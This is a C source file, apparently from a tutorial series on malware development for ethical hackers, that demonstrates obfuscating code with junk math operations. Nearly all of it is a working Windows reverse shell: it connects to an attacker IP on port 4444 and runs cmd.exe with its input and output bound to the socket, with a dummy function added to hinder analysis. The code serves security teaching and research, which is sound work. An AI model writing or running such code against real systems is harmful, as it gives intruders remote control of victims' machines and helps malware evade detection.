/*
 * Malware Development for Ethical Hackers
 * hack.c - ASM code obfuscation
 * author @cocomelonc
*/

#include <winsock2.h>
#include <windows.h>
#include <math.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")

// define a dummy function with math operations
void dummyFunction() {
  volatile int x = 0;
  x += 1;
  x -= 1;
  x *= 2;
  x /= 2;

  // Additional complex math operations
  double y = 2.5;
  double z = 3.7;
  double result = 0.0;

  // Perform math operations
  result = sqrt(pow(y, 2) + pow(z, 2)); // Calculate square root of sum of squares
  result = sin(result); // Calculate sine of the result
  result = cos(result); // Calculate cosine of the result
  result = tan(result); // Calculate tangent of the result

  // Use the result to perform more operations
  for (int i = 0; i < 10; ++i) {
    result *= i;
    result /= (i + 1);
    result += i;
  }

  // Use the final result to perform some conditional operations
  if (result > 100) {
    result -= 100;
  } else {
    result += 100;
  }
}

WSADATA socketData;
SOCKET mainSocket;
struct sockaddr_in connectionAddress;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInfo;

int main(int argc, char* argv[]) {
  
  // ip and port details for the attacker's machine
  char *attackerIP = "10.10.1.5";
  short attackerPort = 4444;

  // initialize socket library
  WSAStartup(MAKEWORD(2, 2), &socketData);

  // create socket object
  mainSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  connectionAddress.sin_family = AF_INET;
  connectionAddress.sin_port = htons(attackerPort);
  connectionAddress.sin_addr.s_addr = inet_addr(attackerIP);

  // establish connection to the remote host
  WSAConnect(mainSocket, (SOCKADDR*)&connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL);

  memset(&startupInfo, 0, sizeof(startupInfo));
  startupInfo.cb = sizeof(startupInfo);
  startupInfo.dwFlags = STARTF_USESTDHANDLES;
  startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE) mainSocket;

  // initiate cmd.exe with redirected streams
  CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);

  // call the dummy function to insert junk instructions
  dummyFunction();

  exit(0);
}
